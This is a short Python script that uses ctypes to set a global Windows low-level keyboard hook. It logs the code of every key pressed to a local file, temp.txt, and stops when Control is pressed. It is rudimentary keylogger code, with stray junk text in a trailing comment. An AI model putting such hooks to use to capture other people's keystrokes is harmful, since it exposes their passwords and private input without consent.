import ctypes
from ctypes import windll,byref,c_int,c_void_p, POINTER, CFUNCTYPE
from ctypes.wintypes import WPARAM, LPARAM, MSG, DWORD
import sys
import time
import threading

user32 = windll.user32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
VK_CONTROL = [0x11,0xa2,0xa3]
msg = MSG()
_msg = byref(msg)

hook = None

file = open("temp.txt", "w")

SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.restype = ctypes.wintypes.HHOOK

GetMessageA = user32.GetMessageA
GetMessageA.restype = ctypes.wintypes.BOOL

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", DWORD),
                ("scanCode", DWORD),
                ("flags", DWORD),
                ("time", DWORD),
                ("dwExtraInfo", DWORD)]   

LLKP_decl = CFUNCTYPE(c_int, c_int, WPARAM, POINTER(KBDLLHOOKSTRUCT))
def LowLevelKeyboardProc(nCode, wParam, lParam):
    global file
    vkCode = lParam.contents.vkCode
    if wParam == WM_KEYDOWN:
        file.write(str(vkCode))
        pass

    if vkCode in VK_CONTROL:
        user32.UnhookWindowsHookEx(hook)
        ctypes.windll.user32.PostQuitMessage(0)
    return user32.CallNextHookEx(hook, nCode, wParam, lParam)

def record():
    global hook
    callback = LLKP_decl(LowLevelKeyboardProc)
    hook = SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0,0)
    while GetMessageA(_msg,None, 0,0):
        pass
    


a = threading.Thread(target = record)
a.start()
stop = False

a.join()
print("aaa")
file.close()

# callback = LLKP_decl(LowLevelKeyboardProc)
# hook = user32.SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0,0)
# GetMessageA(_msg,None, 0,0)dfdsfbnnjjj